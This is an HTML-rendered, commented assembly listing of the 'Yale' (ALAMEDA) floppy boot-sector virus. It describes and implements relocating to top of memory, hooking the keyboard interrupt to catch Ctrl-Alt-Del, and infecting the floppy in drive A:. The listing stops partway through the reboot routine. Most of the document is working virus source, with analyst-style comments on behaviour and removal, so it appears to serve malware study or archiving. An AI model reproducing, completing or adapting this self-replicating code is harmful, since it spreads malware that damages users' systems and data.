<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Boot.Yale.b - ALAMEDA.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; This virus is of the "FLOPPY ONLY" variety.                           ;</span><span class="sc0">
</span><span class="sc1">; It replicates to the boot sector of a floppy disk and when it gains control  </span><span class="sc0">
</span><span class="sc1">; it will move itself to upper memory.  It redirects the keyboard       ;</span><span class="sc0">
</span><span class="sc1">; interrupt (INT 09H) to look for ALT-CTRL-DEL sequences at which time  ;</span><span class="sc0">
</span><span class="sc1">; it will attempt to infect any floppy it finds in drive A:.            ;</span><span class="sc0">
</span><span class="sc1">; It keeps the real boot sector at track 39, sector 8, head 0           ;</span><span class="sc0">
</span><span class="sc1">; It does not map this sector bad in the fat (unlike the Pakistani Brain)</span><span class="sc0">
</span><span class="sc1">; and should that area be used by a file, the virus                     ;</span><span class="sc0">
</span><span class="sc1">; will die.  It also contains no anti detection mechanisms as does the  ;</span><span class="sc0">
</span><span class="sc1">; BRAIN virus.  It apparently uses head 0, sector 8 and not head 1      ;</span><span class="sc0">
</span><span class="sc1">; sector 9 because this is common to all floppy formats both single     ;</span><span class="sc0">
</span><span class="sc1">; sided and double sided.  It does not contain any malevolent TROJAN    ; </span><span class="sc0">
</span><span class="sc1">; HORSE code.  It does appear to contain a count of how many times it   ;</span><span class="sc0">
</span><span class="sc1">; has infected other diskettes although this is harmless and the count  ;</span><span class="sc0">
</span><span class="sc1">; is never accessed.                                                    ;</span><span class="sc0">
</span><span class="sc1">;                                                                       ;</span><span class="sc0">
</span><span class="sc1">; Things to note about this virus:                                      ;</span><span class="sc0">
</span><span class="sc1">; It can not only live through an ALT-CTRL-DEL reboot command, but this ;</span><span class="sc0">
</span><span class="sc1">; is its primary (only for that matter) means of reproduction to other  ;</span><span class="sc0">
</span><span class="sc1">; floppy diskettes.  The only way to remove it from an infected system  ;</span><span class="sc0">
</span><span class="sc1">; is to turn the machine off and reboot an uninfected copy of DOS.      ;</span><span class="sc0">
</span><span class="sc1">; It is even resident when no floppy is booted but BASIC is loaded      ;</span><span class="sc0">
</span><span class="sc1">; instead.  Then when ALT-CTRL-DEL is pressed from inside of BASIC,     ;</span><span class="sc0">
</span><span class="sc1">; it activates and infectes the floppy from which the user is           ;</span><span class="sc0">
</span><span class="sc1">; attempting to boot.                                                   ;</span><span class="sc0">
</span><span class="sc1">;                                                                       ;</span><span class="sc0">
</span><span class="sc1">; Also note that because of the POP CS command to pass control to       ;</span><span class="sc0">
</span><span class="sc1">; its self in upper memory, this virus does not to work on 80286        ;</span><span class="sc0">
</span><span class="sc1">; machines (because this is not a valid 80286 instruction).             ;</span><span class="sc0">
</span><span class="sc1">;                                                                       ;</span><span class="sc0">
</span><span class="sc1">; The Norton Utilities can be used to identify infected diskettes by    ;</span><span class="sc0">
</span><span class="sc1">; looking at the boot sector and the DOS SYS utility can be used to     ;</span><span class="sc0">
</span><span class="sc1">; remove it (unlike the Pakistani Brain).                               ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0">  </span><span class="sc2">7C00H</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TOS</span><span class="sc0"> </span><span class="sc9">LABEL</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0">           </span><span class="sc1">;TOP OF STACK</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; 1. Find top of memory and copy ourself up there. (keeping same offset);</span><span class="sc0">
</span><span class="sc1">; 2. Save a copy of the first 32 interrupt vectors to top of memory too ;</span><span class="sc0">
</span><span class="sc1">; 3. Redirect int 9 (keyboard) to ourself in top of memory              ;</span><span class="sc0">
</span><span class="sc1">; 4. Jump to ourself at top of memory                                   ;</span><span class="sc0">
</span><span class="sc1">; 5. Load and execute REAL boot sector from track 40, head 0, sector 8  ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">BEGIN</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CLI</span><span class="sc0">                 </span><span class="sc1">;INITIALIZE STACK</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TOS</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">STI</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0040H</span><span class="sc0">       </span><span class="sc1">;ES = TOP OF MEMORY - (7C00H+512)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc2">0013H</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MUL</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">07E0H</span><span class="sc0">       </span><span class="sc1">;   (7C00H+512)/16</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">             </span><span class="sc1">;DS = CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">3456H</span><span class="sc0">       </span><span class="sc1">;IF THE VIRUS IS REBOOTING...</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0">  </span><span class="sc5">B_10</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0">  </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">COUNTER_1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;...LOW&amp;HI:COUNTER_1--</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">B_10</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">     </span><span class="sc1">;SP=7C00  ;COPY SELF TO TOP OF MEMORY</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">REP</span><span class="sc0">  </span><span class="sc6">MOVSB</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">     </span><span class="sc1">;CX=0          ;SAVE FIRST 32 INT VETOR ADDRESSES TO</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">    </span><span class="sc1">;   128 BYTES BELOW OUR HI CODE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">REP</span><span class="sc0">  </span><span class="sc6">MOVSB</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">PUT_NEW_09</span><span class="sc0">          </span><span class="sc1">;SAVE/REDIRECT INT 9 (KEYBOARD)</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">   </span><span class="sc1">;ES=HI    ;   JUMP TO OUR HI CODE WITH</span><span class="sc0">
    </span><span class="sc6">NOP</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">   </span><span class="sc1">;DS=0     ;   ES = DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">          </span><span class="sc1">;   SP=7C00  ;LOAD REAL BOOT SECTOR TO 0000:7C00</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">;CX=0        ;DRIVE A: HEAD 0</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2708H</span><span class="sc0">       </span><span class="sc1">;   TRACK 40, SECTOR 8</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201H</span><span class="sc0">       </span><span class="sc1">;   READ SECTOR</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">13H</span><span class="sc0">            </span><span class="sc1">;   (common to 8/9 sect. 1/2 sided!)</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">              </span><span class="sc1">;   HANG IF ERROR</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">JMP_BOOT</span><span class="sc0">       </span><span class="sc1">;JMP 0000:7C00</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; SAVE THEN REDIRECT INT 9 VECTOR                                       ;</span><span class="sc0">
</span><span class="sc1">;                                                                       ;</span><span class="sc0">
</span><span class="sc1">; ON ENTRY:   DS = 0                                                    ;</span><span class="sc0">
</span><span class="sc1">;        ES = WHERE TO SAVE OLD_09 &amp; (HI)                               ;</span><span class="sc0">
</span><span class="sc1">;             WHERE NEW_09 IS         (HI)                              ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">PUT_NEW_09</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0">  </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0413H</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;TOP OF MEMORY (0040:0013) -= 1024</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">;COPY INT 9 VECTOR TO</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OLD_09</span><span class="sc0">    </span><span class="sc1">;   OLD_09 (IN OUR HI CODE!)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0004</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CLI</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">REP</span><span class="sc0">  </span><span class="sc6">MOVSB</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NEW_09</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">STI</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; RESET KEYBOARD, TO ACKNOWLEDGE LAST CHAR                              ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">ACK_KEYBD</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">IN</span><span class="sc0">   </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">61H</span><span class="sc0">              </span><span class="sc1">;RESET KEYBOARD THEN CONTINUE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">   </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0">  </span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0">  </span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">RBOOT</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; DATA AREA WHICH IS NOT USED IN THIS VERSION                           ;</span><span class="sc0">
</span><span class="sc1">; REASON UNKNOWN                                                        ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">TABLE</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;FORMAT INFORMATION FOR TRACK 39</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;   (CURRENTLY NOT USED)</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;A7C9A   LABEL     BYTE           ;</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">   </span><span class="sc2">00024H</span><span class="sc0">              </span><span class="sc1">;NOT USED</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">0ADH</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">07CH</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">0A3H</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">   </span><span class="sc2">00026H</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;L7CA1:                      ;</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc0">             </span><span class="sc1">;NOT USED</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POPF</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc2">1111</span><span class="sc4">:</span><span class="sc2">1111</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; IF ALT &amp; CTRL &amp; DEL THEN ...                                          ;</span><span class="sc0">
</span><span class="sc1">; IF ALT &amp; CTRL &amp; ? THEN ...                                            ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">NEW_09</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSHF</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">STI</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">             </span><span class="sc1">;DS=CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc5">ALT_CTRL</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;BX=SCAN CODE LAST TIME</span><span class="sc0">
    </span><span class="sc6">IN</span><span class="sc0">   </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">60H</span><span class="sc0">              </span><span class="sc1">;GET SCAN CODE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">               </span><span class="sc1">;SAVE IN AH</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">887FH</span><span class="sc0">       </span><span class="sc1">;STRIP 8th BIT IN AL, KEEP 8th BIT AH</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1DH</span><span class="sc0">              </span><span class="sc1">;IS IT A [CTRL]...</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0">  </span><span class="sc5">N09_10</span><span class="sc0">              </span><span class="sc1">;...JUMP IF NO</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">               </span><span class="sc1">;(BL=08 ON KEY DOWN, BL=88 ON KEY UP)</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">N09_30</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">N09_10</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">38H</span><span class="sc0">              </span><span class="sc1">;IS IT AN [ALT]...</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0">  </span><span class="sc5">N09_20</span><span class="sc0">              </span><span class="sc1">;...JUMP IF NO</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">               </span><span class="sc1">;(BH=08 ON KEY DOWN, BH=88 ON KEY UP)</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">N09_30</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">N09_20</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0808H</span><span class="sc0">       </span><span class="sc1">;IF (CTRL DOWN &amp; ALT DOWN)...</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0">  </span><span class="sc5">N09_30</span><span class="sc0">              </span><span class="sc1">;...JUMP IF NO</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">17H</span><span class="sc0">              </span><span class="sc1">;IF [I]...</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">   </span><span class="sc5">N09_X0</span><span class="sc0">              </span><span class="sc1">;...JUMP IF YES</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">53H</span><span class="sc0">              </span><span class="sc1">;IF [DEL]...</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">   </span><span class="sc5">ACK_KEYBD</span><span class="sc0">      </span><span class="sc1">;...JUMP IF YES</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">N09_30</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">ALT_CTRL</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">;SAVE SCAN CODE FOR NEXT TIME</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">N09_90</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POPF</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">0EAH</span><span class="sc0">           </span><span class="sc1">;JMP F000:E987</span><span class="sc0">
</span><span class="sc5">OLD_09</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">   </span><span class="sc2">0F000H</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">N09_X0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">N09_X1</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                                                                       ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">RBOOT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">03D8H</span><span class="sc0">       </span><span class="sc1">;DISABLE COLOR VIDEO !?!?</span><span class="sc0">
